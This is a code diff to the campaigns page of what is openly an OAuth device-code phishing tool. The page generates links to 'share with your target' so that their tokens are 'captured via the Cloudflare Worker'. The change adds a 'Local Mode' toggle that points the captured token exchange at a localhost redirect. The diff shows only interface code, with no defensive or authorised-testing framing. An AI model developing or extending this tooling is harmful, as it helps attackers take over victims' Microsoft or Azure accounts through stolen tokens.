@@ -42,6 +42,7 @@ import {
 } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
 import { Checkbox } from "@/components/ui/checkbox";
+import { Switch } from "@/components/ui/switch";
 import {
   Table,
   TableBody,
@@ -119,6 +120,7 @@ export default function CampaignsPage() {
   const [generatedLink, setGeneratedLink] = useState("");
   const [linkLoading, setLinkLoading] = useState(false);
   const [linkCopied, setLinkCopied] = useState(false);
+  const [localMode, setLocalMode] = useState(false);
 
   // Deploy Worker state
   const [deployLoading, setDeployLoading] = useState(false);
@@ -197,7 +199,7 @@ export default function CampaignsPage() {
     setGeneratedLink("");
     setLinkCopied(false);
     try {
-      const res = await generateOAuthLink();
+      const res = await generateOAuthLink(localMode);
       setGeneratedLink(res.link);
       setLinkDialogOpen(true);
     } catch (err: any) {
@@ -342,6 +344,16 @@ export default function CampaignsPage() {
         subtitle="Manage device-code flow campaigns and monitor authentication status"
         actions={
           <div className="flex items-center gap-2">
+            <div className="flex items-center gap-2 mr-2">
+              <Switch
+                id="local-mode"
+                checked={localMode}
+                onCheckedChange={setLocalMode}
+              />
+              <label htmlFor="local-mode" className="text-xs text-muted-foreground cursor-pointer">
+                Local Mode
+              </label>
+            </div>
             <Button
               size="sm"
               variant="outline"
@@ -567,7 +579,13 @@ export default function CampaignsPage() {
           <DialogHeader>
             <DialogTitle>Generated OAuth Link</DialogTitle>
             <DialogDescription>
-              Share this link with your target. It uses a random worker subdomain for each generation.
+              {localMode ? (
+                <span className="text-amber-400">
+                  Local Mode: The redirect URI points to localhost. Make sure your Azure app accepts <code className="bg-secondary/50 px-1 rounded">http://localhost:8080/exchange</code> or set LOCAL_REDIRECT_URI in your .env file.
+                </span>
+              ) : (
+                "Share this link with your target. After authorization, the token will be captured via the Cloudflare Worker."
+              )}
             </DialogDescription>
           </DialogHeader>
           <div className="space-y-4 py-2">
